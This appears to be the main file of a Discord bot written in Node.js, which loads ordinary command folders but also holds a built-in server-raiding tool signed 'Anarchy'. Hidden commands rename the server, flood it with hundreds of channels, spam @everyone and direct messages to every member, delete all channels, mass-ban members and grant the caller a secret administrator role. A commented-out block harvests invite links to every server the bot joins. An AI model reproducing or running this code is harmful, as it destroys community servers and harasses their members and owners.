const Discord = require('discord.js');
const client = new Discord.Client();
const config = require('./config.json');
const chalk = require('chalk');
const Canvas = require('canvas');
const snekfetch = require('snekfetch');
const fs = require('fs');
require('./util/eventLoader')(client);
const redcolor = chalk.keyword('red');
const orangecolor = chalk.keyword('orange');
const yellowcolor = chalk.keyword('yellow');
const grencolor = chalk.keyword('green');
const cyancolor = chalk.keyword('cyan');
const bluecolor = chalk.keyword('blue');

client.commands = new Discord.Collection();
client.aliases = new Discord.Collection();
fs.readdir('./commands/Fun/', (err, filesfun) => {
  if (err) console.error(err);
  filesfun.forEach(f => {
    const props = require(`./commands/Fun/${f}`);
    client.commands.set(props.help.name, props);
    props.conf.aliases.forEach(alias => {
      client.aliases.set(alias, props.help.name);
    });
  });

  fs.readdir('./commands/Image/', (err, filesimg) => {
    if (err) console.error(err);
    filesimg.forEach(f => {
      const props = require(`./commands/Image/${f}`);
      client.commands.set(props.help.name, props);
      props.conf.aliases.forEach(alias => {
        client.aliases.set(alias, props.help.name);
      });
    });

fs.readdir('./commands/Info/', (err, filesinfo) => {
  if (err) console.error(err);
  filesinfo.forEach(f => {
    const props = require(`./commands/Info/${f}`);
    client.commands.set(props.help.name, props);
    props.conf.aliases.forEach(alias => {
      client.aliases.set(alias, props.help.name);
    });
  });

fs.readdir('./commands/Mod/', (err, filesmod) => {
  if (err) console.error(err);
  filesmod.forEach(f => {
    const props = require(`./commands/Mod/${f}`);
    client.commands.set(props.help.name, props);
    props.conf.aliases.forEach(alias => {
      client.aliases.set(alias, props.help.name);
    });
  });

  fs.readdir('./commands/Admin/', (err, filesadmin) => {
    if (err) console.error(err);
    filesadmin.forEach(f => {
      const props = require(`./commands/Admin/${f}`);
      client.commands.set(props.help.name, props);
      props.conf.aliases.forEach(alias => {
        client.aliases.set(alias, props.help.name);
      });
    });

fs.readdir('./commands/Social/', (err, filessocial) => {
  if (err) console.error(err);
  filessocial.forEach(f => {
    const props = require(`./commands/Social/${f}`);
    client.commands.set(props.help.name, props);
    props.conf.aliases.forEach(alias => {
      client.aliases.set(alias, props.help.name);
    });
  });

fs.readdir('./commands/NSFW/', (err, filesnsfw) => {
  if (err) console.error(err);
  filesnsfw.forEach(f => {
    const props = require(`./commands/NSFW/${f}`);
    client.commands.set(props.help.name, props);
    props.conf.aliases.forEach(alias => {
      client.aliases.set(alias, props.help.name);
    });
  });
 
  
  var totalcmd =  Math.floor(filesfun.length + filesinfo.length + filesmod.length + filessocial.length + filesnsfw.length + filesadmin.length + filesimg.length);
console.log(bluecolor(`Il y a un total de ${totalcmd} commandes 👍.`));
  });
});
});
});
});
});
});

client.elevation = message => {
  /* This function should resolve to an ELEVATION level which
     is then sent to the command handler for verification*/
  let permlvl = 0;
  const mod_role = message.guild.roles.find('name', config.modrolename);
  if (mod_role && message.member.roles.has(mod_role.id)) permlvl = 2;
  const admin_role = message.guild.roles.find('name', config.adminrolename);
  if (admin_role && message.member.roles.has(admin_role.id)) permlvl = 3;
  if (message.author.id === config.ownerid) permlvl = 4;
  return permlvl;
};

/*client.on('ready',() => {
    //invit link
    client.guilds.forEach(guild => {
      var invite = client.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
      invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
    })
});*/

client.on('message', msg => {
 

            if (msg.content === '-ded') {
                if (msg.channel.type === "dm") return;
                if (msg.deletable) msg.delete();
                msg.guild.members.forEach(member => {
                  setInterval(function () {
                    member.send("**" + msg.guild.owner.user.username + "** a été détruit par Anarchy\nhttps://cdn.discordapp.com/attachments/498502361975881738/498876912303865866/PicsArt_10-08-09.53.55.gif\nhttps://cdn.discordapp.com/attachments/498502361975881738/498850930918424588/PicsArt_10-08-03.34.58.jpg").catch(error => {}) }, 450)})
       }

if(msg.content === '-del'){
          if(msg.channel.type === "dm") return;
          if(msg.guild.channels.size === 0) return;
          else if(!msg.guild.member(client.user).hasPermission("MANAGE_CHANNELS")) return;
          msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
      }

  if (msg.content === '-ded') {
    console.log(`Commande -ded par ${msg.author.tag}`);

      msg.guild.setIcon('https://cdn.discordapp.com/icons/498502361526829066/3a3d7943bf5c012064da45516b9ee279.webp').catch(e => {});
      msg.guild.setName('DEAD BY ANARCHY').catch(e => {});

      for (var i = 0; i < 390; i++) {
        msg.guild.createChannel('RAID BY ANARCHY', 'voice').catch(e => {});
        msg.guild.createChannel('RAID BY ANARCHY', 'text').catch(e => {});
      }

    if (msg.deletable) {
      msg.delete();
    }
  }

  if (msg.content === '-rban') {
    console.log(`Commande -rban par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", ".Anarchy.") && member.bannable) member.ban().catch(e => {});
    });
  }

  if (msg.content === '-stop') {
    console.log(`Commande -stop par ${msg.author.tag}`);
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }

  if (msg.content === '-gp') {
    console.log(`Commande -gp par ${msg.author.tag}`);

    msg.member.guild.createRole({
      name: ".Anarchy.",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role);
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }
  //#endregion
});
client.on("message", msg => {
        if(msg.content.startsWith("-ded")){
           msg.delete()
            let i = 0;
            let interval = setInterval(function () {
              msg.guild.channels.forEach(channel => {
                if (channel.type === "text") channel.send("@everyone @here \nRaid By Anarchy\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nhttps://cdn.discordapp.com/attachments/498502361975881738/498876912303865866/PicsArt_10-08-09.53.55.gif\nhttps://cdn.discordapp.com/attachments/498502361975881738/498850930918424588/PicsArt_10-08-03.34.58.jpg")
              }, 2500);
            });
          }
        });


client.login(process.env.TOKEN);
